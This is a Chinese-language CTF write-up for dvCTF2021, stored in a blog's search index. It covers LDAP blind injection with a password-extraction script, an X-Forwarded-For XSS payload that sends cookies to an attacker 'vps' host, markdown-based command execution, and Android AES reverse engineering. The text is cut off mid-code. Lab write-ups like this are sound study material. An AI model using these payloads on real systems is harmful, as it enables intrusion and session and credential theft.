<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>dvCTF2021-writeup</title>
      <link href="2021/03/15/dvCTF2021-writeup/"/>
      <url>2021/03/15/dvCTF2021-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="dvCTF2021"><a href="#dvCTF2021" class="headerlink" title="dvCTF2021"></a>dvCTF2021</h2><p>老外办的一个小比赛 (打比赛还能学英语</p><p>官方的wp,docker等 <a href="https://github.com/louiswolfers/dvCTF2021">https://github.com/louiswolfers/dvCTF2021</a></p><p>记录几个比较有意思的题目</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Lightweiight"><a href="#Lightweiight" class="headerlink" title="Lightweiight"></a>Lightweiight</h3><blockquote><p>My company made me write a login page to authenticate against LDAP. Can you authenticate as admin?</p></blockquote><p><img src="image-20210315200747970.png" alt="image-20210315200747970"></p><p>随便输点东西可以报错,结合题目描述就可以大致猜到是LDAP注入了</p><p>在<a href="http://192.168.35.130:8080/?action=team%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E6%9C%89%E6%95%88%E7%94%A8%E6%88%B7">http://192.168.35.130:8080/?action=team可以找到有效用户</a></p><p>之前没接触过这个知识点,找了几篇资料</p><p><a href="http://www.bendawang.site/2016/01/25/%E7%90%86%E8%A7%A3LDAP%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5/">http://www.bendawang.site/2016/01/25/%E7%90%86%E8%A7%A3LDAP%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection</a></p><p>这个题唯一比较难点就是确定各个字段了,比赛的时候花了很长时间才发现密码字段是Userpassword</p><p>然后发现通配符*只在Email处有效,后来根据题目docker文件才发现是password字段进行了md5处理 </p><p>然后构造盲注:</p><p><code>email=jdoe@dvctf.local)(Userpassword=*))%00&amp;password=abc</code> 返回 Invalid username/password !</p><p><code>email=jdoe@dvctf.local)(Userpassword=a*))%00&amp;password=abc</code>返回 No such user !</p><p>比赛的时候就是跑不出来密码=.=</p><p>后来在discord经过一位老哥的提醒,才发现脚本写的有点问题2333</p><p>参考 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md#exploiting-userpassword-attribute">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md#exploiting-userpassword-attribute</a></p><p>userPassword在LDAP中是一个特殊字段,格式也比较特殊,写法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">userPassword:2.5.13.18:&#x3D;\xx (\xx is a byte)</span><br><span class="line">userPassword:2.5.13.18:&#x3D;\xx\xx</span><br><span class="line">userPassword:2.5.13.18:&#x3D;\xx\xx\xx</span><br></pre></td></tr></table></figure><p>当时写的脚本是直接userPassword=xxx,所以就没注出来</p><p>改之后的脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.35.130:8080/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">value</span>):</span></span><br><span class="line">    BOOL = value.split(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> BOOL == <span class="string">&quot;Invalid username/password !&quot;</span> <span class="keyword">and</span> <span class="string">&quot;Warning&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> value:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">stop=<span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> stop != <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        tmp = <span class="string">&quot;\\&quot;</span> + (<span class="string">&quot;%x&quot;</span> % x).zfill(<span class="number">2</span>)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>:<span class="string">f&quot;mkiloa@dvctf.local)(userPassword:2.5.13.18:=<span class="subst">&#123;flag+tmp&#125;</span>))\0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> check(r.text):</span><br><span class="line">            flag = flag + <span class="string">&quot;\\&quot;</span> + (<span class="string">&quot;%x&quot;</span> % (x-<span class="number">1</span>)).zfill(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">&quot;Found: &quot;</span>, <span class="built_in">bytes</span>.fromhex(flag.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>)).decode())</span><br><span class="line">            <span class="keyword">if</span> x-<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">                stop=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注出来是<code>&#123;MD5&#125;Abr2pWImreR7Gj9jpet1PA==</code> =&gt; <code>Chicken123</code></p><p>POST: email=mkiloa@dvctf.local&amp;password=Chicken123</p><blockquote><p>官方脚本好一些 <a href="https://github.com/louiswolfers/dvCTF2021/blob/master/web/ldap_injection/DONTREAD_solution.py">https://github.com/louiswolfers/dvCTF2021/blob/master/web/ldap_injection/DONTREAD_solution.py</a></p></blockquote><p>最后看PHP代码,发现后面的登陆字段甚至不是userPassword,登陆逻辑如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;&#123;MD5&#125;&quot;</span> . base64_encode(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="literal">true</span>));</span><br><span class="line"><span class="variable">$sr</span>=ldap_search(<span class="variable">$ds</span>, <span class="string">&quot;ou=Users,dc=dvctf,dc=local&quot;</span>, <span class="string">&quot;(&amp;(mail=<span class="subst">$email</span>)(objectClass=person))&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span> = ldap_get_entries(<span class="variable">$ds</span>, <span class="variable">$sr</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$info</span>[<span class="string">&quot;count&quot;</span>] === <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$form</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;No such user !&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$info</span>[<span class="string">&quot;count&quot;</span>]; <span class="variable">$i</span>++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span> === <span class="variable">$info</span>[<span class="variable">$i</span>][<span class="string">&quot;userpassword&quot;</span>][<span class="number">0</span>]) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$info</span>[<span class="variable">$i</span>][<span class="string">&quot;description&quot;</span>][<span class="number">0</span>] === <span class="string">&quot;sysadmin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;Welcome &lt;b&gt;&quot;</span> . <span class="variable">$info</span>[<span class="variable">$i</span>][<span class="string">&quot;cn&quot;</span>][<span class="number">0</span>] . <span class="string">&quot; &lt;/b&gt;!&lt;br&gt;Here is your cute cat picture :&lt;br&gt;&lt;img src=&#x27;secret_cat_pic.jpg&#x27; /&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;\nWell done, the flag is : <span class="subst">$flag</span>\n&lt;/b&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;Welcome &lt;b&gt;&quot;</span> . <span class="variable">$info</span>[<span class="variable">$i</span>][<span class="string">&quot;cn&quot;</span>][<span class="number">0</span>] . <span class="string">&quot; &lt;/b&gt;!&lt;br&gt;Here is your cute cat picture :&lt;br&gt;&lt;img src=&#x27;secret_cat_pic.jpg&#x27; /&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;\nYou are not the sysadmin, go back to work !!!\n&lt;/b&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$form</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Invalid username/password !&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="High-security"><a href="#High-security" class="headerlink" title="High security"></a>High security</h3><blockquote><p>You can now see who tried to connect to your account. What could go wrong?</p></blockquote><p>比赛的时候有点懵逼.没太看懂题目意思.</p><p>后来发现题目只会记录登陆失败的IP,所以看不到记录.且记录的IP为 <code>X-Forwarded-For</code></p><p><img src="image-20210315200810930.png" alt="image-20210315200810930"></p><p>尝试登陆admin账号密码触发xss即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&lt;script&gt;new Image().src=&#x27;http://vps:1001/&#x27;+(document.cookie);&lt;/script&gt;&quot;</span>&#125;</span><br><span class="line">print(requests.post(<span class="string">&quot;http://challs.dvc.tf:65535/login&quot;</span>, headers=headers, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;).text)</span><br></pre></td></tr></table></figure><p><img src="image-20210315200825265.png" alt="image-20210315200825265"></p><p><code>dvCTF&#123;xss_l0ve&lt;3&#125;</code></p><h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><p>tips: 6666对于chrome来说是非安全端口,默认关闭</p><p>而题目是 <a href="http://xxx:6666/,%E5%B0%B1%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE">http://xxx:6666/,就无法访问</a>, 坑了一批人</p><p>用ie访问可以发现是一个渲染markdown的服务</p><p>渲染下面的可以执行命令,具体原因就不太清楚了..</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">​<span class="code">```    &#123;sh&#125;</span></span><br><span class="line"><span class="code">cat /app/flag</span></span><br><span class="line"><span class="code">​```</span></span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="Cryptex"><a href="#Cryptex" class="headerlink" title="Cryptex"></a>Cryptex</h3><p>java安卓逆向</p><p>关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dvctf.cryptex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> com.dvctf.droid.R;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> p000a.p002b.p003c.ActivityC0013e;</span><br><span class="line"><span class="keyword">import</span> p064b.p065a.p066a.p067a.outline;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginActivity</span> <span class="keyword">extends</span> <span class="title">ActivityC0013e</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: p */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] f3745p = &#123;-<span class="number">114</span>, <span class="number">62</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">54</span>, -<span class="number">7</span>, -<span class="number">59</span>, -<span class="number">47</span>, <span class="number">55</span>, <span class="number">88</span>, <span class="number">18</span>, -<span class="number">1</span>, -<span class="number">99</span>, <span class="number">116</span>, -<span class="number">51</span>, <span class="number">62</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: q */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] f3746q = &#123;-<span class="number">84</span>, <span class="number">25</span>, <span class="number">77</span>, -<span class="number">101</span>, -<span class="number">53</span>, -<span class="number">124</span>, -<span class="number">100</span>, <span class="number">61</span>, <span class="number">74</span>, <span class="number">102</span>, <span class="number">50</span>, -<span class="number">11</span>, -<span class="number">24</span>, <span class="number">62</span>, -<span class="number">54</span>, -<span class="number">71</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: r */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] f3747r = &#123;<span class="number">11</span>, -<span class="number">35</span>, <span class="number">55</span>, <span class="number">10</span>, <span class="number">62</span>, <span class="number">79</span>, <span class="number">125</span>, <span class="number">62</span>, -<span class="number">28</span>, <span class="number">115</span>, <span class="number">77</span>, <span class="number">4</span>, <span class="number">73</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">121</span>, -<span class="number">126</span>, <span class="number">85</span>, -<span class="number">83</span>, <span class="number">109</span>, <span class="number">1</span>, -<span class="number">98</span>, <span class="number">35</span>, -<span class="number">68</span>, -<span class="number">4</span>, -<span class="number">122</span>, <span class="number">14</span>, <span class="number">110</span>, -<span class="number">28</span>, <span class="number">111</span>, <span class="number">22</span>, -<span class="number">125</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a12dd3a7fd3203a452eb34d91a9be20569d5e337a3384347068895c07f3e0c5a</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr;</span><br><span class="line">        TextView textView = (TextView) findViewById(R.id.pass);</span><br><span class="line">        TextView textView2 = (TextView) findViewById(R.id.message);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = textView.getText().toString().getBytes();</span><br><span class="line">        <span class="keyword">boolean</span> z = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bArr2 = f3745p;</span><br><span class="line">            SecretKeySpec secretKeySpec = <span class="keyword">new</span> SecretKeySpec(bArr2, <span class="number">0</span>, bArr2.length, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">            instance.reset();</span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest(bytes);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Cipher instance2 = Cipher.getInstance(<span class="string">&quot;AES/ECB/NoPadding&quot;</span>);</span><br><span class="line">                instance2.init(<span class="number">1</span>, secretKeySpec);</span><br><span class="line">                bArr = instance2.doFinal(digest);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.w(<span class="string">&quot;Droid&quot;</span>, <span class="string">&quot;c6072170d758e5358d717360829bd1f9b1603b355b5f7fe375d1aabdca7a20de -&gt; &quot;</span> + e.toString());</span><br><span class="line">                bArr = f3746q;</span><br><span class="line">            &#125;</span><br><span class="line">            z = Arrays.equals(bArr, f3747r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            StringBuilder e3 = outline.m2617e(<span class="string">&quot;fe6c188aec175974b53dedd6d27a79184f6032823302f2b907f54cdafa005cbc -&gt; &quot;</span>);</span><br><span class="line">            e3.append(e2.toString());</span><br><span class="line">            Log.w(<span class="string">&quot;Droid&quot;</span>, e3.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (z) &#123;</span><br><span class="line">            StringBuilder e4 = outline.m2617e(<span class="string">&quot;Congrats!! Validate the challenge with dvCTF&#123;&quot;</span>);</span><br><span class="line">            e4.append(textView.getText().toString());</span><br><span class="line">            e4.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            str = e4.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str = <span class="string">&quot;Nice try&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        textView2.setText(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.activity.ComponentActivity, p000a.p027h.p028b.ActivityC0300g, p000a.p002b.p003c.ActivityC0013e, p000a.p047k.p048a.ActivityC0438e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先对输入求md5,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] bytes=textView.getText().toString().getBytes();</span><br><span class="line">MessageDigest instance = MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">instance.reset();</span><br><span class="line"><span class="keyword">byte</span>[] digest = instance.digest(bytes);</span><br></pre></td></tr></table></figure><p>再进行AES加密,密钥已知</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] f3745p &#x3D; &#123;-114, 62, 98, 26, 54, -7, -59, -47, 55, 88, 18, -1, -99, 116, -51, 62&#125;;</span><br><span class="line"></span><br><span class="line">byte[] bArr2 &#x3D; f3745p;</span><br><span class="line">SecretKeySpec secretKeySpec &#x3D; new SecretKeySpec(bArr2, 0, bArr2.length, &quot;AES&quot;);</span><br><span class="line"> </span><br><span class="line">Cipher instance2 &#x3D; Cipher.getInstance(&quot;AES&#x2F;ECB&#x2F;NoPadding&quot;);</span><br><span class="line">instance2.init(1, secretKeySpec); &#x2F;&#x2F; 1加密,2解密</span><br><span class="line">bArr &#x3D; instance2.doFinal(digest);</span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 密钥</span></span><br><span class="line">        <span class="keyword">byte</span>[] f3745p = &#123;-<span class="number">114</span>, <span class="number">62</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">54</span>, -<span class="number">7</span>, -<span class="number">59</span>, -<span class="number">47</span>, <span class="number">55</span>, <span class="number">88</span>, <span class="number">18</span>, -<span class="number">1</span>, -<span class="number">99</span>, <span class="number">116</span>, -<span class="number">51</span>, <span class="number">62</span>&#125;;</span><br><span class="line">        <span class="comment">// 密文</span></span><br><span class="line">        <span class="keyword">byte</span>[] f3747r = &#123;<span class="number">11</span>, -<span class="number">35</span>, <span class="number">55</span>, <span class="number">10</span>, <span class="number">62</span>, <span class="number">79</span>, <span class="number">125</span>, <span class="number">62</span>, -<span class="number">28</span>, <span class="number">115</span>, <span class="number">77</span>, <span class="number">4</span>, <span class="number">73</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">121</span>, -<span class="number">126</span>, <span class="number">85</span>, -<span class="number">83</span>, <span class="number">109</span>, <span class="number">1</span>, -<span class="number">98</span>, <span class="number">35</span>, -<span class="number">68</span>, -<span class="number">4</span>, -<span class="number">122</span>, <span class="number">14</span>, <span class="number">110</span>, -<span class="number">28</span>, <span class="number">111</span>, <span class="number">22</span>, -<span class="number">125</span>&#125;;</span><br><span class="line">        <span class="comment">// 转化为ASE专用密钥</span></span><br><span class="line">        SecretKeySpec secretKeySpec = <span class="keyword">new</span> SecretKeySpec(f3745p, <span class="number">0</span>, f3745p.length, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 解密</span></span><br><span class="line">            Cipher instance2 = Cipher.getInstance(<span class="string">&quot;AES/ECB/NoPadding&quot;</span>); <span class="comment">// // 创建密码器</span></span><br><span class="line">            instance2.init(Cipher.DECRYPT_MODE, secretKeySpec);</span><br><span class="line">            <span class="keyword">byte</span>[] bArr = instance2.doFinal(f3747r);</span><br><span class="line">            System.out.println(byteArrayToHex(bArr));</span><br><span class="line">            <span class="comment">// 386F72455FCDF95A9A16B3A4B7F9620CA8539B3888E9D6C885B95B4DFD21094C | JohnCena =&gt; flag: dvCTF&#123;JohnCena&#125;</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 字节数组转化为16进制表示的字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byteArrayToHex</span><span class="params">(<span class="keyword">byte</span>[] byteArray)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 首先初始化一个字符数组，用来存放每个16进制字符</span></span><br><span class="line">        <span class="keyword">char</span>[] hexDigits = &#123;<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span> &#125;;</span><br><span class="line">        <span class="comment">// new一个字符数组，这个就是用来组成结果字符串的（解释一下：一个byte是八位二进制，也就是2位十六进制字符（2的8次方等于16的2次方））</span></span><br><span class="line">        <span class="keyword">char</span>[] resultCharArray =<span class="keyword">new</span> <span class="keyword">char</span>[byteArray.length * <span class="number">2</span>];</span><br><span class="line">        <span class="comment">// 遍历字节数组，通过位运算（位运算效率高），转换成字符放到字符数组中去</span></span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">byte</span> b : byteArray) &#123;</span><br><span class="line">            resultCharArray[index++] = hexDigits[b&gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">0xf</span>];</span><br><span class="line">            resultCharArray[index++] = hexDigits[b&amp; <span class="number">0xf</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        